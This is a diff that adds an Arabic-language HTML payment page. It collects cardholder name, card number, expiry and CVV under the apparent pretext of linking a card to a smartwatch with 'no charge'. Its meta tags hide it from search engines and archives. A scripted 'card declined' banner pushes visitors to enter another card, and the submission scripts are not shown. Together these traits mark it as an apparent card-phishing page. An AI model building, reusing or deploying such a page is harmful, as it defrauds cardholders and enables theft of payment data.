@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>الدفع</title>
+  <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" rel="stylesheet" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    .content {
+      background: white;
+      border-radius: 0 0 20px 20px;
+      padding: 30px 20px;
+      margin: -30px 10px 30px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      min-height: 200px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .content-section {
+      display: none;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group label {
+      font-size: 14px;
+      font-weight: 400;
+      color: #1a6fc4;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    #loadingOverlay.show {
+      display: flex;
+    }
+
+    #loadingOverlay h5 {
+      color: white;
+      margin-top: 20px;
+    }
+
+    #loadingOverlay p {
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    @keyframes cardDeclineAnim {
+      0% {
+        opacity: 0;
+        transform: translateY(-20px) scale(0.95);
+      }
+      50% {
+        transform: translateY(5px) scale(1.02);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        box-shadow: 0 8px 24px rgba(220, 53, 69, 0.35);
+      }
+      50% {
+        box-shadow: 0 8px 32px rgba(220, 53, 69, 0.5);
+      }
+    }
+  </style>
+</head>
+<div class="container">
+  <div id="decline-message" role="alert" style="display: none; background: linear-gradient(135deg, #dc3545 0%, #c82333 100%); border: none; border-radius: 16px; padding: 20px 24px; margin-top: 20px; box-shadow: 0 8px 24px rgba(220, 53, 69, 0.35); animation: cardDeclineAnim 0.5s ease-out;">
+    <div style="display: flex; align-items: flex-start; gap: 16px;">
+      <div style="width: 52px; height: 52px; background: rgba(255, 255, 255, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; backdrop-filter: blur(10px);">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="15" y1="9" x2="9" y2="15"></line>
+          <line x1="9" y1="9" x2="15" y2="15"></line>
+        </svg>
+      </div>
+      <div style="flex: 1; text-align: right;">
+        <div style="color: white; font-size: 18px; font-weight: 700; margin-bottom: 6px; letter-spacing: -0.3px;">تم رفض البطاقة</div>
+        <div style="color: rgba(255, 255, 255, 0.95); font-size: 14px; line-height: 1.6; margin-bottom: 8px;">عذراً، لم يتم قبول بطاقتك الائتمانية</div>
+        <div style="background: rgba(255, 255, 255, 0.15); border-radius: 8px; padding: 10px 14px; backdrop-filter: blur(5px);">
+          <div style="color: white; font-size: 13px; font-weight: 500;">💳 يرجى استخدام بطاقة أخرى أو اختيار وسيلة دفع بديلة</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<body dir="rtl">
+
+  <div class="container mt-5" id="applePayRadio">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-lg-4">
+        <div style="
+              border: 1px solid #ddd;
+              border-radius: 12px;
+              font-family: 'Tahoma', sans-serif;
+              overflow: hidden;
+            ">
+          <div style="padding: 16px">
+            <div class="text-right">
+              <h6 style="color: #626262">نظام ربط البطاقة</h6>
+              <hr />
+
+              <h6 style="font-size: 12px; font-weight: 700; color: #146394">
+                البطاقة مطلوبة فقط لربطها في الساعة الذكية - لن يتم خصم أي مبلغ
+              </h6>
+              <div class="d-flex mb-3">
+                <img alt="" id="pay_com" width="60px" />
+              </div>
+
+              <form id="paymentForm">
+                <div class="form-group">
+                  <label for="codeـholderـname">اسم حامل البطاقة</label>
+                  <input class="form-control text-center" id="codeـholderـname" type="text" />
+                </div>
+                <div class="form-group">
+                  <label for="cardـnumber">رقم البطاقة</label>
+                  <input class="form-control text-center" id="cardـnumber" placeholder="0000 0000 0000 0000"
+                    type="tel" />
+                </div>
+                <div class="d-flex justify-content-center">
+                  <div class="form-group ml-2">
+                    <label for="expirationـdate">تاريخ انتهاء البطاقة</label>
+                    <input class="form-control text-center" id="expirationـdate" placeholder="MM/YY" type="tel" />
+                  </div>
+                  <div class="form-group text-left">
+                    <label for="cvv">CVV / CVC</label>
+                    <input autocomplete="cc-csc" class="form-control text-center" id="cvv" placeholder="***"
+                      type="password" />
+                  </div>
+                </div>
+                <button class="btn btn-warning col-12 p-2" style="
+                      background-color: #faa62e;
+                      color: #fff;
+                      font-weight: 800;
+                    " type="submit">
+                  ربط البطاقة
+                </button>
+                <p class="mt-3 text-secondary" style="font-size: 10px">
+                  نحرص على استخدام بياناتك الشخصية فقط لغرض ربط البطاقة بالساعة الذكية، وذلك
+                  بما يتوافق مع الأغراض الموضحة في سياسة الخصوصية المعتمدة وفق
+                  الأنظمة المعمول بها في جمهورية مصر العربية.
+                </p>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="container mt-3 text-right justify-content-center">
+    <img alt="" src="assets/photos/vecteezy-icon.png" width="100px" />
+    <img alt="" src="assets/photos/vecteezy_icon01.jpg" width="45px" />
+  </div>
+
+
+  <div id="loadingOverlay">
+    <div class="spinner-border text-light" role="status"></div>
+    <h5 class="font-weight-bold">جاري التحقق...</h5>
+    <p>يرجى الانتظار حتى تتم معالجة طلبك</p>
+  </div>
+
+
+
+  <script>
+   
+    document.addEventListener("DOMContentLoaded", () => {
+      
+     
+      if (sessionStorage.getItem('cardDeclined') === 'true') {
+        const declineMessage = document.getElementById('decline-message');
+        if (declineMessage) {
+          declineMessage.style.display = 'block';
+          declineMessage.style.animation = 'cardDeclineAnim 0.5s ease-out, pulse 2s ease-in-out infinite 0.5s';
+        }
+       
+        sessionStorage.removeItem('cardDeclined');
+        
+       
+        setTimeout(() => {
+          declineMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 200);
+      }
+    });
+  </script>
+<script src="js/p1.js"></script>
+<script src="js/p2.js"></script>
+<script src="js/p3.js"></script>
+
+<script src="js/kn5k.js"></script>
+</body>
+
+</html>
